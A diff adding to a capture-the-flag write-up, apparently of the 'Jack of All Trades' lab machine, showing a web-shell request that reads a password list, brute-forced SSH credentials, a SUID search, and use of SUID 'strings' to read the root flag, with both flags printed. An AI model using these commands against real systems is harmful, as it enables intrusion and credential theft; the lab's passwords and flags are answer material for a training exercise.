@@ -80,4 +80,84 @@ drwxr-x--- 3 jack jack 4096 Feb 29 2020 jack
 -rw-r--r-- 1 root root 408 Feb 29 2020 jacks_password_list
 -rw-r--r-- 1 root root 408 Feb 29 2020 jacks_password_list
 ```
-                                           
+
+`http://10.10.8.110:22/nnxhweOV/index.php?cmd=cat%20/home/jacks_password_list`
+```
+GET me a 'cmd' and I'll run it for you Future-Jack.
+*hclqAzj+2GC+=0K
+eN<A@n^zI?FE$I5,
+X<(@zo2XrEN)#MGC
+,,aE1K,nW3Os,afb
+ITMJpGGIqg1jn?>@
+0HguX{,fgXPE;8yF
+sjRUb4*@pz<*ZITu
+[8V7o^gl(Gjt5[WB
+yTq0jI$d}Ka<T}PD
+Sc.[[2pL<>e)vC4}
+9;}#q*,A4wd{<X.T
+M41nrFt#PcV=(3%p
+GZx.t)H$&awU;SO<
+.MVettz]a;&Z;cAC
+2fh%i9Pr5YiYIf51
+TDF@mdEd3ZQ(]hBO
+v]XBmwAk8vk5t3EF
+9iYZeZGQGG9&W4d1
+8TIFce;KjrBWTAY^
+SeUAwt7EB#fY&+yt
+n.FZvJ.x9sYe5s5d
+8lN{)g32PG,1?[pM
+z@e1PmlmQ%k5sDz@
+ow5APF>6r,y4krSo
+ow5APF>6r,y4krSo
+```
+`[80][ssh] host: 10.10.8.110   login: jack   password: ITMJpGGIqg1jn?>@
+`
+
+/user.jpg
+`securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}`
+
+```
+jack@jack-of-all-trades:~$ find /  -perm /4000
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/pt_chown
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/strings
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/procmail
+/usr/sbin/exim4
+find: `/sys/kernel/debug': Permission denied
+find: `/var/lib/container': Permission denied
+find: `/var/lib/php5/sessions': Permission denied
+find: `/var/lib/sudo/lectured': Permission denied
+find: `/var/log/apache2': Permission denied
+find: `/var/log/exim4': Permission denied
+find: `/var/cache/ldconfig': Permission denied
+find: `/var/spool/cron/crontabs': Permission denied
+find: `/var/spool/cron/atspool': Permission denied
+find: `/var/spool/cron/atjobs': Permission denied
+find: `/var/spool/rsyslog': Permission denied
+find: `/var/spool/exim4': Permission denied
+find: `/root': Permission denied
+/bin/mount
+/bin/umount
+/bin/su
+
+```
+
+```
+jack@jack-of-all-trades:~$ strings /root/root.txt
+ToDo:
+1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
+2.Make T-Rex model!
+3.Meet up with Johny for a pint or two
+4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
+5.Remember to finish that contract for Lisa.
+6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
+
+```
